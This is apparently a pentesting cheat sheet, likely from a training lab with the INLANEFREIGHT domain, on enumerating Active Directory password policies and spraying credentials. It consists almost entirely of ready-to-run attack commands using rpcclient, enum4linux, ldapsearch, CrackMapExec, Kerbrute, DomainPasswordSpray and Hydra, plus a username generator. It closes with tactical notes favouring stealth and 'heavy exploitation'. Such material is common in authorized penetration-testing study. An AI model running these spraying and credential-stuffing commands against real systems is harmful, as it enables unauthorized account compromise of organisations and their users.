# Password Policies & Spraying

Goal: Identify lockout policies and safely test credentials.

---

# Generate Username Combinations

#!/bin/bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x; done

---

# RPC Password Policy

rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo

---

# Enum4linux Password Policy

enum4linux -P 172.16.5.5

enum4linux-ng -P 172.16.5.5 -oA ilfreight

---

# LDAP Password Policy

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep pwdHistoryLength

---

# CrackMapExec Policy Check

crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

---

# Password Spraying

for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

---

# DomainPasswordSpray (PowerShell)

Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

---

# Credential Stuffing (Hydra)

hydra -C <user_pass.list> ssh://<IP>

---

# Tactical Notes

- Always check lockout policy first.
- Use password spraying over brute force.
- Prefer Kerbrute for stealth.
- Validate creds before heavy exploitation.
